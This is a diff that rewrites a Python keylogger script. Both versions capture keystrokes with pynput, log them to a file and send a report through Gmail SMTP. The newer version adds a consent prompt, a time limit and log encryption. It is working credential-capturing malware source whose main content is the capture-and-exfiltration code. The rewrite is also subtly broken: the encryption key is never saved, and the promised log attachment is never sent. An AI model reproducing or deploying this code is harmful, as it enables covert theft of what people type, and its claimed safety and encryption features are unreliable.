@@ -1,88 +1,179 @@
-'''
-Keyloggers are programs that capture your key strokes. They can be used to keep logs of everything you press
-    on the keyboard and can be used for malicious purposes, i.e.: spyware, stealing login credentials.
+"""
+Keyloggers are programs that capture your keystrokes. They can be used for legitimate purposes like monitoring
+employee activity (with consent) or for malicious purposes like stealing credentials.
 
-Current keyloggers have lots of functionalities. They record and display the exact date and time of each keystroke,
-    on which application the keystrokes were entered, easy-to-read logs, etc.
+⚠️ IMPORTANT: This program is for EDUCATIONAL PURPOSES ONLY.
+Unauthorized use to monitor others without consent is ILLEGAL.
 
-This program is simply a basic keylogger with limited functionality, which are to:
--> Capture and save your keystrokes to a "keylogger.txt" file
--> Send the contents of the file to your email (sender email is gmail with no two-factor authentication)
+Features:
+- Records keystrokes to an encrypted log file
+- Sends logs via email (Gmail with app password)
+- Includes timestamp for each session
+- Has safety features (time limit, confirmation prompt)
+- Properly handles special keys
 
-To run: Open the file in terminal and enter "python keylogger.py".
-To escape: Press Esc key to exit the keylogger.
+Requirements:
+- Python 3.x
+- pynput (pip install pynput)
+- cryptography (pip install cryptography)
 
-Modules used:
--> smtplib (pre-installed on Python)
--> ssl (pre-installed on Python)
--> pynput (requires installation with "pip install pynput")
-'''
-
-# Defines an SMTP client session object to send mail to any internet machine with an SMTP or ESMTP listener daemon
-import smtplib
-# Provides access to TLS/SSL encryption and peer authentication facilities for network sockets
-import ssl
-# Allows the control and monitoring of input devices (mouse and keyboard)
-from pynput import keyboard
-
-# Replace user@domain.com with your email id (everywhere)
-sender_mail = "user@domain.com"
-# prefer using your own email id for receiver's as well.
-# Replace user@domain.com with your email id (everywhere)
-receiver_mail = "user@domain.com"
-password = "passcode"              # Enter your Password here
-port = 587
-message = """From: user@domain.com
-To: user@domain.com                         
-Subject: KeyLogs
-Text: Keylogs 
+Usage:
+1. Set up your email credentials (see instructions below)
+2. Run with: python keylogger.py
+3. Press ESC to stop
 """
 
+import smtplib
+import ssl
+from pynput import keyboard
+from cryptography.fernet import Fernet
+import time
+import os
+from datetime import datetime
 
-def write(text):
-    with open("keylogger.txt", 'a') as f:
-        f.write(text)
-        f.close()
+# Configuration - REPLACE THESE VALUES
+CONFIG = {
+    "sender_email": "your_email@gmail.com",  # Your Gmail address
+    "receiver_email": "your_email@gmail.com",  # Can be same as sender
+    "email_password": "your_app_password",  # Use an App Password (not regular password)
+    "max_duration": 60,  # Maximum runtime in seconds (0 for unlimited)
+    "log_file": "keylog_encrypted.log"
+}
 
+# Generate encryption key (store this securely in real applications)
+KEY = Fernet.generate_key()
+cipher_suite = Fernet(KEY)
 
-def on_key_press(Key):
+def show_legal_warning():
+    """Display legal warning and get user confirmation"""
+    print("\n" + "="*60)
+    print("⚠️  LEGAL WARNING  ⚠️")
+    print("This keylogger is for EDUCATIONAL PURPOSES ONLY.")
+    print("Unauthorized use to monitor others is ILLEGAL in most jurisdictions.")
+    print("You must have EXPLICIT CONSENT from anyone being monitored.")
+    print("="*60)
+    print("\nFeatures:")
+    print("- Encrypted log file")
+    print("- Time-limited operation")
+    print("- Email notification")
+    print("- Special key handling")
+    print("\nUse responsibly. The creators are not responsible for misuse.")
+    print("="*60)
+
+    while True:
+        response = input("\nDo you understand and accept these terms? (yes/no): ").lower()
+        if response == 'yes':
+            break
+        elif response == 'no':
+            print("Exiting...")
+            exit()
+        else:
+            print("Please answer 'yes' or 'no'")
+
+def get_timestamp():
+    """Return formatted timestamp"""
+    return datetime.now().strftime("[%Y-%m-%d %H:%M:%S]")
+
+def write_log(text):
+    """Write encrypted log to file"""
     try:
-        if (Key == keyboard.Key.enter):
-            write("\n")
-        else:
-            write(Key.char)
-    except AttributeError:
-        if Key == keyboard.Key.backspace:
-            write("\nBackspace Pressed\n")
-        elif (Key == keyboard.Key.tab):
-            write("\nTab Pressed\n")
-        elif (Key == keyboard.Key.space):
-            write(" ")
-        else:
-            temp = repr(Key)+" Pressed.\n"
-            write(temp)
-            print("\n{} Pressed\n".format(Key))
+        encrypted_text = cipher_suite.encrypt(text.encode())
+        with open(CONFIG["log_file"], "ab") as f:
+            f.write(encrypted_text + b"\n")
+    except Exception as e:
+        print(f"Error writing log: {e}")
 
-
-def on_key_release(Key):
-    # This stops the Listener/Keylogger.
-    # You can use any key you like by replacing "esc" with the key of your choice
-    if (Key == keyboard.Key.esc):
+def on_press(key):
+    """Handle key press events"""
+    # Check duration limit
+    if CONFIG["max_duration"] > 0 and (time.time() - start_time) > CONFIG["max_duration"]:
+        print(f"\n⏰ Maximum duration of {CONFIG['max_duration']} seconds reached.")
         return False
 
+    try:
+        # Handle regular keys
+        if hasattr(key, 'char'):
+            if key.char == '\r':  # Enter key
+                write_log(f"{get_timestamp()} [ENTER]")
+            else:
+                write_log(f"{get_timestamp()} {key.char}")
+        # Handle special keys
+        else:
+            key_name = str(key).replace("Key.", "")
+            write_log(f"{get_timestamp()} [{key_name.upper()}]")
+    except Exception as e:
+        print(f"Error processing key: {e}")
 
-with keyboard.Listener(on_press=on_key_press, on_release=on_key_release) as listener:
-    listener.join()
+def on_release(key):
+    """Handle key release events"""
+    if key == keyboard.Key.esc:
+        print("\nESC pressed - stopping keylogger...")
+        return False
 
-with open("keylogger.txt", 'r') as f:
-    temp = f.read()
-    message = message + str(temp)
-    f.close()
+def send_email():
+    """Send encrypted logs via email"""
+    try:
+        # Read and encrypt the log file
+        with open(CONFIG["log_file"], "rb") as f:
+            encrypted_logs = f.read()
 
-context = ssl.create_default_context()
-server = smtplib.SMTP('smtp.gmail.com', port)
-server.starttls()
-server.login(sender_mail, password)
-server.sendmail(sender_mail, receiver_mail, message)
-print("Email Sent to ", sender_mail)
-server.quit()
+        # Create email message
+        subject = f"Keylogger Report - {datetime.now().strftime('%Y-%m-%d %H:%M')}"
+        body = f"""Keylogger report from {time.ctime()}
+
+⚠️ This email contains sensitive information.
+The attached logs are encrypted.
+
+Configuration used:
+- Duration: {'Unlimited' if CONFIG['max_duration'] == 0 else f'{CONFIG["max_duration"]} seconds'}
+- Start time: {datetime.fromtimestamp(start_time).strftime('%Y-%m-%d %H:%M:%S')}
+"""
+
+        message = f"""From: {CONFIG['sender_email']}
+To: {CONFIG['receiver_email']}
+Subject: {subject}
+
+{body}
+"""
+
+        # Send email
+        context = ssl.create_default_context()
+        with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
+            server.login(CONFIG["sender_email"], CONFIG["email_password"])
+            server.sendmail(CONFIG["sender_email"], CONFIG["receiver_email"], message)
+            print(f"✉️ Email sent to {CONFIG['receiver_email']}")
+
+    except Exception as e:
+        print(f"❌ Failed to send email: {e}")
+
+def cleanup():
+    """Clean up resources"""
+    try:
+        os.remove(CONFIG["log_file"])
+        print(f"Deleted log file: {CONFIG['log_file']}")
+    except:
+        pass
+
+if __name__ == "__main__":
+    # Show warning and get confirmation
+    show_legal_warning()
+
+    # Initialize
+    start_time = time.time()
+    print(f"\n🚀 Starting keylogger at {get_timestamp()}")
+    print(f"Log file: {CONFIG['log_file']}")
+    print(f"Maximum duration: {'Unlimited' if CONFIG['max_duration'] == 0 else f'{CONFIG["max_duration"]} seconds'}")
+    print("Press ESC to stop manually...\n")
+
+    # Start keylogger
+    try:
+        with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
+            listener.join()
+    except Exception as e:
+        print(f"Error in keylogger: {e}")
+    finally:
+        # Send email and clean up
+        if os.path.exists(CONFIG["log_file"]):
+            send_email()
+        cleanup()
+        print("\nKeylogger stopped.")
